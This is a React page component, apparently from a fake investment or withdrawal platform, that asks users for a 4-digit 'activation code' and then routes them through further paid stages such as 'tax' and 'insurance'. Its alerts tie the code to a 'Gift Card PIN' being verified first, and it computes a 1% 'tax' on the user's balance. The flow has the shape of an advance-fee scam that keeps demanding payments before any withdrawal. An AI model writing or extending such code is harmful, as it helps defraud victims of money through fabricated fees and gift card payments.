// src/pages/ConfirmActivate.jsx
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { confirmStagePin, getDashboard } from '../services/api'; // ensure these exist
import './styles/confirmactivate.css';

export default function ConfirmActivate() {
  const loc = useLocation();
  const nav = useNavigate();
  const { withdrawalId } = loc.state || {};

  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState(null);
  const [loadingBalance, setLoadingBalance] = useState(true);

  useEffect(() => {
    // fetch dashboard to get user's balance (used to compute tax amount = 1%)
    let mounted = true;
    (async () => {
      try {
        const res = await getDashboard();
        if (!mounted) return;
        const b = Number(res.data.balance || 0);
        setBalance(b);
      } catch (err) {
        console.error('Failed to fetch dashboard for balance', err);
        setBalance(0);
      } finally {
        if (mounted) setLoadingBalance(false);
      }
    })();
    return () => { mounted = false; };
  }, []);

  if (!withdrawalId) {
    return (
      <div className="page-container">
        <div className="card">
          <h3>Confirm activation</h3>
          <p className="muted">No withdrawal was found in this flow. Go back to the Withdraw page and create a preview first.</p>
          <div style={{ marginTop: 12 }}>
            <button className="btn-outline" onClick={() => nav('/withdraw')}>Back to withdraw</button>
          </div>
        </div>
      </div>
    );
  }

  const handleConfirm = async () => {
    if (pin.length !== 4) return alert('Please enter the 4-digit activation code from your dashboard notifications');

    setLoading(true);
    try {
      const payload = { withdrawalId, stage: 'activation', pin };
      const res = await confirmStagePin(payload);

      // expecting { success: true/false, nextStage: 'tax'|'insurance'|..., amount: number }
      const data = res.data || {};
      if (data.success) {
        const nextStage = data.nextStage || 'tax';

        // compute tax amount = 1% of balance (if we have balance and next stage is tax)
        let taxAmount = 0;
        if (nextStage === 'tax') {
          const b = Number(balance || 0);
          taxAmount = Number((b * 0.01).toFixed(2));
        }

        // Redirect based on next stage
        if (nextStage === 'access') {
          // final access granted
          nav('/withdraw/access', { state: { withdrawalId } });
        } else {
          // route to generic stage payment page (for tax: amount included)
          nav('/withdraw/stage', { state: { withdrawalId, stage: nextStage, amount: taxAmount } });
        }
      } else {
        // backend returned success: false (shouldn't happen often)
        alert(data.message || 'Incorrect pin. Please check your dashboard notifications for the activation code.');
      }
    } catch (err) {
      console.error('confirm activate error', err);
      const msg = err?.response?.data?.message || 'Failed to confirm activation. Please check your notifications for the code.';
      // If no pin set for this stage, give the custom guidance requested
      if (msg && msg.toLowerCase().includes('no pin set')) {
        alert('Verifying your Gift Card PIN. No activation PIN set yet. Return to your dashboard and check notifications, your activation PIN will be sent within 10 minutes once the Gift Card PIN is verified.');
        nav('/dashboard');
      } else if (msg && msg.toLowerCase().includes('incorrect pin')) {
        alert('Incorrect pin. Go back to your dashboard notifications to get the correct code (activation pin will be sent within 10 minutes).');
        nav('/dashboard');
      } else {
        alert(msg);
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-container">
      <div className="card" style={{ maxWidth: 640 }}>
        <h3>Confirm activation</h3>

        <p className="muted">
          Check your dashboard notifications for your <strong>activation code</strong>.
          Enter the 4-digit code below to activate your withdrawal. If you entered an incorrect code, you will be asked to check your dashboard notifications for the correct code.
        </p>

        <div style={{ marginTop: 12 }}>
          <label>
            <span>4-digit activation code</span>
            <input
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
              placeholder="e.g. 1234"
              maxLength={4}
              className="input"
              style={{ marginTop: 6, width: 160 }}
            />
          </label>
        </div>

        <div style={{ marginTop: 14 }}>
          <button className="btn" onClick={handleConfirm} disabled={loading}>
            {loading ? 'Checking...' : 'Confirm'}
          </button>
          <button className="btn-outline" style={{ marginLeft: 8 }} onClick={() => nav('/dashboard')}>Go to dashboard</button>
        </div>

        {/* Balance and tax information - hidden but functionality preserved */}
        <div className="balance-tax-info" style={{ marginTop: 14, color: '#6b7280', fontSize: 13 }}>
          {loadingBalance ? 'Loading account info...' : `Your current balance: $${(Number(balance || 0)).toFixed(2)} • Tax due (1%): $${(Number(balance || 0) * 0.01).toFixed(2)}`}
        </div>
      </div>
    </div>
  );
}